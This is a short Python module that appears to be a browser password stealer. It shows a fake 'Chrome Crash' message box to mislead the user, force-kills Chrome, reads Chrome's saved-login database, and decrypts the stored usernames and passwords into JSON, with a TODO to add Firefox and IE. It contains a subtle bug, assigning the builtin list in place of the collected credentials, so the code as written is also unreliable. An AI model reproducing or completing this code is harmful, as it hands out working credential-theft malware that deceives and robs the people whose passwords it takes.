from os import getenv
import sqlite3
import psutil
from win32crypt import CryptUnprotectData
from json import dumps
from utils import messageBox


def kill():
    PROCNAME = 'chrome.exe'
    messageBox(u'Chrome has encountered some problem. \n Needs to close', u'Chrome Crash')
    for proc in psutil.process_iter():
        try:
            if proc.name() == PROCNAME:
                proc.kill()
        except psutil.AccessDenied:
            pass


def extract():
    kill()
    conn = sqlite3.connect(getenv('APPDATA') + '\..\Local\Google\Chrome\User Data\Default\Login Data')
    sql = conn.cursor()
    sql.execute('SELECT action_url,username_value,password_value from logins')
    text = {}

    for data in sql.fetchall():
        password = CryptUnprotectData(data[2], None, None, None, 0)[1]
        if password:
            list1 = []
            list1.append(data[1])
            list1.append(password)
            text[data[0]] = list
    return dumps(text)


    # TODO : Add Feature for firefox and IE
